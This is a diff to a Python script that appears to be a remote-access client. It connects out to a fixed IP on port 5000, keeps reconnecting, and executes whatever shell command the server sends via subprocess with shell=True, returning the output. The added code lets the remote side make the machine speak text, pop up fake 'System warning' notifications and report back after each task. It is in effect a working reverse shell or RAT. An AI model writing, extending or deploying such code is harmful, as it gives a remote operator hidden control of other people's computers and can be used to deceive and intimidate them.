@@ -3,9 +3,18 @@ import webbrowser as wb
 import os
 import subprocess
 import time   # 🔥 add
-
-HOST = '0.0.0.0'
+from plyer import notification
+import pyttsx3
+HOST = '100.111.190.57'
 PORT = 5000
+
+def speak(audio):
+    engine = pyttsx3.init("sapi5")
+    engine.setProperty("rate",170)
+    engine.setProperty("volume",1.0)
+    engine.stop()
+    engine.say(audio)
+    engine.runAndWait()
 
 # 🔥 reconnect loop
 while True:
@@ -50,16 +59,45 @@ while True:
         try:
             app = data.replace("open ", "").strip()
             wb.open(f"https://{app}.com")
+            send_to_server(f"{app} opened")   # 🔥 add this
         except:
             send_to_server("wrong domain name")
+
     elif data.lower() == "exit":
         break
+
+    if data.startswith("speak "):
+        try:
+            audio = data.replace("speak ", "").strip()
+            speak(audio)
+            send_to_server("voice speaked")   # 🔥 add this
+        except:
+            send_to_server("can't speak voice")
+    
+    
+    elif data.startswith("show alert"):
+        try:
+            alert = data.replace("show alert ", "").strip()
+            notification.notify(
+                title="System warning",
+                message=f"{alert}",
+                timeout = 5
+            )
+            send_to_server(f"alert showed")   # 🔥 add this
+        except:
+            send_to_server("can't show the alert")
 
     else:
         try:
             data = subprocess.check_output(f"{data}", shell=True).decode()
             send_to_server(data)
+            send_to_server("task complete")
         except:
-           send_to_server("The Command Is Wrong Please Check The Command That You Entered")
+           send_to_server(f"{data} command is wrong please give right command")
+
+
+    
+
+    
 
 client.close()
